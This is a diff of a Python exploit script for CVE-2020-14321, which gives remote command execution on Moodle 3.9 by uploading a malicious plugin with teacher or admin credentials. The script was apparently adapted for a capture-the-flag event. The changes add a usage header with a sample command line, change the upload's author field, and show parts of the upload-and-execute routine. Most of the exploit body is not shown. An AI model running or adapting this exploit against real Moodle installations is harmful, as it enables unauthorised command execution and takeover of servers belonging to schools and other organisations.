@@ -1,4 +1,22 @@
-#!/usr/bin/python3
+
+#  This Python script exploits CVE-2020-14321 on Moodle 3.9
+#	https://moodle.org/mod/forum/discuss.php?d=407393
+
+# Original Exploit Author > lanz
+#  https://github.com/lanzt/CVE-2020-14321
+#
+# Adapted by the CapoBAY Team to be used over a CaptureTheFlag event. 
+# --Removed cookie method
+
+# Compiler: python3
+#  
+# Usage: 
+#
+# Having valid "moodle admin"/teacher credentials
+# ❭ python3 suyScript.py -url http://test.local:8080 -u USER -p 'Passwd!' -cmd id
+#
+# BriefExplanation: A malicious plugin that allows remote command execution is build&uploaded to the moodle site.
+
 
 import random
 import string
@@ -115,11 +133,13 @@ def RCE(url,sess,cadena,command):
 	"sesskey": (None,new_sess_key),
 	"repo_id": (None,"5"),
 	"itemid": [itemid, itemid],
-	"author": (None,"sergio moya"),
+	"author": (None,"admin"),
 	'title': (None, cadena+".zip"),
 	"ctx_id" : (None,"1"),
 	"accepted_types[]": [".zip",".zip"],
 	}
+	
+	
 # Subir el plugin
 
 	url_upload =url+"/repository/repository_ajax.php"
@@ -168,7 +188,9 @@ def RCE(url,sess,cadena,command):
 	print(Color.GREEN + response.text + Color.END)
 	os.system("rm " + cadena + ".zip")
 
-	
+
+# Provide user interface	
+
 if __name__ == '__main__':
 	
 	print(Color.YELLOW + """          
@@ -198,7 +220,6 @@ if __name__ == '__main__':
 	
 		""" + Color.END + Color.RED	+"""																	
 						***CVE 2020 14321***    """ + Color.END + Color.YELLOW	+ """
-    
     
     
     
